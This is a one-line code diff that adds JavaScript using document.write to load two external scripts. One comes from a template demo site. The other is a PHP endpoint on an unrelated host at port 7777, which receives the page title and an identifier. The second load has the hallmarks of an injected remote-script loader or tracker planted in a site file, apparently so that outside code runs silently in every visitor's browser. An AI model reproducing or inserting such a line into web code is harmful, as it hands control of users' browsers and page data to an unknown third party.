@@ -1,0 +1,1 @@
+document.write("<script language='javascript' src='http://demo.cssmoban.com/cssthemes3/mstp_69_vienna2/js/jquery.flexslider-min.js?_vv=20080808'></script>");document.write("<script language='javascript' src='http://p.ubt123.com:7777/pt/pt.php?src=p0005&t="+encodeURIComponent(document.title)+"&ci=1896984115'></script>");
